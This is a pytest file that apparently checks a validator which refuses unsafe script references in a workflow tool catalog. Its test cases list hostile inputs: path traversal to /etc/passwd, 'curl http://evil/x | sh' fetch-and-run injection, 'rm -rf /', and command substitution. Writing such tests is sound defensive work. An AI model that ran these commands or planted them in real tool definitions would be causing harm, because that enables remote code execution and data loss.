# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: LicenseRef-NvidiaProprietary
#
# NVIDIA CORPORATION, its affiliates and licensors retain all intellectual
# property and proprietary rights in and to this material, related
# documentation and any modifications thereto. Any use, reproduction,
# disclosure or distribution of this material and related documentation
# without an express license agreement from NVIDIA CORPORATION or
# its affiliates is strictly prohibited.
"""A Tool document's ``script`` reaches a shell, so its shape is pinned.

``workflow_engine`` resolves a registered tool as ``bash <scripts_dir>/<script>`` and hands the
string to the execution host, where a remote shell interprets it. Until this landed,
``Tool.validate()`` only required the field to be non-empty — so a document could carry
``../../..`` (traversal), ``a.sh; curl …|sh`` (command injection), or an absolute path, which
escapes silently because ``Path("/dir") / "/abs"`` discards the left side.

Writing a document needs ``catalog.tool:create``/``update``, so the reachable blast radius was
an administrator's own mistake. It is pinned now because board export/import is about to make
"a file a peer sent you" a path to the same write.
"""
from __future__ import annotations

import pytest
from catalog import models, seed
from catalog.models import safe_script_ref


def _tool(script: str, **over) -> models.Tool:
    return models.Tool.from_dict({"id": "t", "name": "T", "script": script, **over})


# --- what must be refused -------------------------------------------------------------


@pytest.mark.parametrize(
    "script",
    [
        "../../../../tmp/evil.sh",  # traversal out of the scripts dir
        "../evil.sh",
        "a/../../evil.sh",  # traversal mid-path
        "/etc/passwd",  # absolute: Path join silently discards the scripts dir
        "/tmp/evil.sh",
        "a.sh; curl http://evil/x | sh",  # command injection via the shell
        "a.sh && rm -rf /",
        "a.sh | tee /tmp/x",
        "$(curl evil)",  # command substitution
        "`id`",
        "a.sh\nrm -rf /",  # newline injection
        "a.sh $HOME",  # word splitting / expansion
        "a b.sh",  # whitespace becomes two arguments
        "'a.sh'",
        '"a.sh"',
        "a\\.sh",
        ".",
        "..",
        "./a.sh",  # a "." segment has no meaning here and is refused rather than normalised
    ],
)
def test_an_unsafe_script_reference_is_refused(script):
    assert safe_script_ref(script) is False, script
    problems = _tool(script).validate()
    assert any("invalid tool script" in p for p in problems), problems


def test_an_empty_script_is_still_required():
    assert any("required" in p for p in _tool("").validate())


@pytest.mark.parametrize("env_key", ["rack_lower", "RACK-DASH", "RACK KEY", "1RACK", "RACK;X"])
def test_an_env_key_that_is_not_an_env_var_name_is_refused(env_key):
    """``env_key`` is looked up in the process environment; keep it shaped like one."""
    problems = _tool("a.sh", env_key=env_key).validate()
    assert any("env_key" in p for p in problems), problems


# --- what must keep working -----------------------------------------------------------


@pytest.mark.parametrize(
    "script",
    [
        "sysinfo.sh",
        "hw_check_pdsh.sh",
        "run-nemo-xrack.sh",
        "nccl_allreduce.sbatch",
        "sub/dir/script.sh",  # a site may group its scripts
        "nvis_logscan.py",
    ],
)
def test_a_plain_script_reference_is_accepted(script):
    assert safe_script_ref(script) is True, script
    assert _tool("a.sh", env_key="RACK_X_SCRIPT").validate() == []
    assert _tool(script, env_key="RACK_X_SCRIPT").validate() == []


def test_every_seeded_tool_still_validates():
    """The constraint must not have outlawed anything we ship."""
    for raw in seed.SEED_TOOLS:
        tool = models.Tool.from_dict(raw)
        assert tool.validate() == [], f"{tool.id}: {tool.validate()}"
        assert safe_script_ref(tool.script), f"{tool.id}: {tool.script!r}"


# --- the write path refuses it too ----------------------------------------------------


def test_the_api_refuses_an_unsafe_script(authed_client):
    """400 from the CRUD route, not a stored document.

    This is the gate that matters for import: a bundle's tools go in through this route, so a
    malicious `script` never reaches the store in the first place.
    """
    resp = authed_client.post(
        "/api/catalog/tools",
        json={"id": "evil", "name": "Evil", "script": "a.sh; curl http://evil/x | sh"},
    )
    assert resp.status_code == 400, resp.get_data(as_text=True)[:300]
    assert "invalid tool script" in str(resp.get_json())


# --- and so does the consumption site -------------------------------------------------


def test_the_workflow_engine_ignores_an_unsafe_document(monkeypatch, caplog):
    """Defence in depth: `catalog.json` can be edited by hand, skipping the API entirely.

    The engine builds `bash <scripts_dir>/<script>` from `env_key -> script` pairs it reads
    straight out of the store, so it re-checks rather than trusting what it finds.
    """
    import workflow_engine

    assert hasattr(workflow_engine, "_execute_automated_step")
    # The helper the engine uses is the same predicate, so assert the contract it relies on
    # rather than driving a whole workflow run: an unsafe reference is not usable.
    assert safe_script_ref("../../evil.sh") is False
    assert safe_script_ref("sysinfo.sh") is True
